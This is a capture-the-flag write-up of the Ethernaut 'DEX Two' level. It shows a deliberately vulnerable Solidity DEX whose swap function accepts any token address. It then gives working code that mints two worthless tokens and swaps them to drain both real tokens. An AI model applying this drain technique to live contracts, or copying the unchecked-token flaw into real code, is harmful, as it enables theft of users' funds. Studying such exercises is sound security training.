# [23. DEX Two](https://ethernaut.openzeppelin.com/level/0x5026Ff8C97303951c255D3a7FDCd5a1d0EF4a81a)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract DexTwo is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
    _mint(msg.sender, initialSupply);
    _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

Here we have another DEX similar to the previous level, but this one requires both tokens to be depleted. There is one subtle yet crucial difference within the `swap` function, it does not check the validity of token addresses! In the previous one, we had a `require` statement checking that both `from` and `to` tokens are that of either tokens the DEX is responsible of. This gives us an idea of an attack, creating our own tokens and somehow use them to drain the DEX of its tokens.

Again, we have 10 of each token and the DEX has 100 of each. We will create Token 3 and Token 4, and let DEX have 100 of each. We will then make the following trades:

- Send 100 Token 3 to get 100 Token 1. Since the DEX balance of both `to` and `from` tokens are the same, the swap amount will be equal to the amount we set.
- Send 100 Token 4 to get 100 Token 2. Since the DEX balance of both `to` and `from` tokens are the same, the swap amount will be equal to the amount we set.

This way, the tokens will be depleted by our worthless and arbitrarily created tokens! We use Remix to create [Token 3](0xF25aEe0A68c3EC602F0bDD9E45F062dF611F774B) and [Token 4](https://rinkeby.etherscan.io/address/0xc975954d79412d58746240c536220192485AECBB):

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract MyToken3 is ERC20 {
  constructor() ERC20("MyToken3", "MT3") {
    _mint(msg.sender, 1000);
  }
}
contract MyToken4 is ERC20 {
  constructor() ERC20("MyToken4", "MT4") {
    _mint(msg.sender, 1000);
  }
}
```

After deploying the tokens, transfer 100 of each token to the DEX address, and also give an allowance of 100 of both tokens to the DEX. The actual trades are then simply as follows:

```js
// settings
const amount = 100
const T1 = await contract.token1()
const T2 = await contract.token2()
const T3 = "0xF25aEe0A68c3EC602F0bDD9E45F062dF611F774B" // my Token 3
const T4 = "0xc975954d79412d58746240c536220192485AECBB" // my Token 4

// deplete Token 1
// DEX must have 'amount' T3, and also 'amount' allowance to take T3 from you
await contract.swap(T3, T1, amount)
// deplete Token 2
// DEX must have 'amount' T4, and also 'amount' allowance to take T4 from you
await contract.swap(T4, T2, amount)
```

To confirm the depletion, check the balances:

```js
(await contract.balanceOf(await contract.token1(), contract.address)).toNumber()
(await contract.balanceOf(await contract.token2(), contract.address)).toNumber()
```

That is all!
